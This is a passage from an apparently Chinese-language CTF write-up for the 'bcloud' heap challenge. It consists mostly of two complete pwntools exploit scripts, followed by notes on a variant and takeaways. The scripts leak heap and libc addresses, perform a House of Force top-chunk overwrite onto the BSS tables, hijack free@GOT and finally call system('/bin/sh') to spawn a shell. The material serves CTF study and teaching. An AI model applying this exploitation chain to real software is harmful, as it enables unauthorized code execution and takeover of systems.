      r.send(content)
    def delet(idx):
      r.recvuntil("option--->>")
      r.sendline("4")
      r.recvuntil("Input the id:")
      r.sendline(str(idx))
    #MAIN EXPLOIT
    #leak heap addr
    r.recvuntil("Input your name:")
    r.send('N' * 0x40)
    r.recvuntil('Hey ' + 'N'*0x40)
    _heap_addr = r.recv(4)
    heap_addr = u32(_heap_addr) - 8 #due to being the first chunk, heap_addr is just the heap base
    print('heap_base_addr:')
    print(hex(heap_addr))
    #overflow the top chunk
    r.recvuntil("Org:")
    r.send('A' * 0x40)
    r.recvuntil("Host:")
    r.sendline(p32(0xffffffff))
    #top chunk hijack to idx_table
    idx_table_addr = 0x804B120
    fake_topchunk_head = idx_table_addr - 0x08
    raw_topchunk_head = heap_addr + (0x48 * 3)
    offset = fake_topchunk_head - raw_topchunk_head - 0x08
    lenth_input = offset - 4
    new_hj(lenth_input) #idx.0, top chunk pointing where we need
    #attack idx_table
    payload0 = p32(0) + p32(0x804B014) + p32(0x804B010) + p32(0x804B130) + '/bin/shx00'
    new(len(payload0),payload0)
    #hijack free_got to leak_echo
    payload1 = p32(0x8048779) + 'n'
    edit(1,payload1)
    #leak printf_got and calculate libc_base
    delet(2)
    r.recvuntil('Hey ')
    _printf_got = r.recv(4)
    printf_got = u32(_printf_got)
    libc_base = printf_got - 0x49670
    system_addr = libc_base + 0x3ada0
    print('system:')
    print(hex(system_addr))
    #hijack free_got to system
    payload2 = p32(system_addr) + 'n'
    edit(1,payload2)
    #fire
    delet(3)
    r.interactive()
注意我们edit函数的payload末尾加上了’n’，这是必要的，因为payload长度比lenth_table_bss中对应的长度短，必须用’n’来结束读入，否则会一直等输入。
另外一种相似的思路是，hof劫持到lenth_table_bss，多写点字节就到了idx_table_bss了，一样可以篡改，然后就可以顺便把lenth_table_bss[0]改为4，这样就可以使用上面第一种内存部署了，而且不用加’n’，不过这样要多费点时间计算偏移，我们也给出相应exp：
    from pwn import *
    #ARCH SETTING
    context(arch = 'i386' , os = 'linux')
    r = process('./bcloud')
    #r = remote('127.0.0.1',9999)
    #FUNCTION DEFINE
    def new(size,content):
      r.recvuntil("option--->>")
      r.sendline("1")
      r.recvuntil("Input the length of the note content:")
      r.sendline(str(size))
      r.recvuntil("Input the content:")
      r.send(content)
    def new_hj(size):
      r.recvuntil("option--->>")
      r.sendline("1")
      r.recvuntil("Input the length of the note content:")
      r.sendline(str(size))
    def edit(idx,content):
      r.recvuntil("option--->>")
      r.sendline("3")
      r.recvuntil("Input the id:")
      r.sendline(str(idx))
      r.recvuntil("Input the new content:")
      r.send(content)
    def delet(idx):
      r.recvuntil("option--->>")
      r.sendline("4")
      r.recvuntil("Input the id:")
      r.sendline(str(idx))
    #MAIN EXPLOIT
    #leak heap addr
    r.recvuntil("Input your name:")
    r.send('N' * 0x40)
    r.recvuntil('Hey ' + 'N'*0x40)
    _heap_addr = r.recv(4)
    heap_addr = u32(_heap_addr) - 8 #due to being the first chunk, heap_addr is just the heap base
    print('heap_base_addr:')
    print(hex(heap_addr))
    #overflow the top chunk
    r.recvuntil("Org:")
    r.send('A' * 0x40)
    r.recvuntil("Host:")
    r.sendline(p32(0xffffffff))
    #top chunk hijack to lenth_table
    len_table_addr = 0x804B0A0
    fake_topchunk_head = len_table_addr - 0x08
    raw_topchunk_head = heap_addr + (0x48 * 3)
    offset = fake_topchunk_head - raw_topchunk_head - 0x08
    lenth_input = offset - 4
    new_hj(lenth_input) #idx.0, top chunk pointing where we need
    #attack lenth_table and idx_table
    payload0_0 = p32(4)
    payload0_1 = 'x00'*0x7c
    payload0_2 = p32(0x804B014) + p32(0x804B010) + p32(0x804B12C) + '/bin/shx00'
    payload0 = payload0_0 + payload0_1 + payload0_2
    new(len(payload0),payload0)
    #hijack free_got to leak_echo
    edit(0,p32(0x8048779))
    #leak printf_got and calculate libc_base
    delet(1)
    r.recvuntil('Hey ')
    _printf_got = r.recv(4)
    printf_got = u32(_printf_got)
    libc_base = printf_got - 0x49670
    system_addr = libc_base + 0x3ada0
    print('system:')
    print(hex(system_addr))
    #hijack free_got to system
    edit(0,p32(system_addr))
    #fire
    delet(2)
    r.interactive()
最后，还有一个稍不同的思路值得一提，唯一的不同就在于篡改free_got泄露内存时，我们不篡改为leak_echo函数，而是篡改到puts_plt（或printf_got），然而事情没有这么简单，比如说劫持到puts_plt吧，那我们泄露时就直接：
    delet(1)
    _printf_got = r.recv(4)
看似顺理成章，然而这样对吗？如果你这样改发现是调不通的，因为我们看exp中delet函数的定义用的是r.recvuntil(“Input the
id:”)，而原程序中是用的puts来打印”Input the
id:”的，当用delet中的recvuntil的时候实际上还有一个换行符没接到！！因此exp就会卡在那儿！照原来劫持到leak_echo的情况，我们有个r.recvuntil(‘Hey
‘)可以继续执行下去，可是劫持到puts_plt的话就必须在r.recv(4)之前来个r.recvline()来冲掉那个换行符：
    delet(1)
    r.recvline()
    _printf_got = r.recv(4)
## 六、总结与心得
  1. pwn选手的脑子应该有灵性，应该尤其懂得剑走偏锋，也要考虑周全面面俱到，一个思路走不通要学会换思路，exp开发要注意微妙的耦合效应！
  2. 有时候看到某些漏洞不要急着开心，有可能看起来是漏洞，其实是个坑！比如此例中的off by one。
  3. 由于plt表的本质是个jmp，所以从抽象的角度看劫持到plt和劫持到真正的函数地址是等价的，但是注意目标plt对应的got表可不能被破坏啊。
最后希望过路的大佬们如果有对前面所提EOF的问题有解决方法的，有劳评论区分享一下Orz~~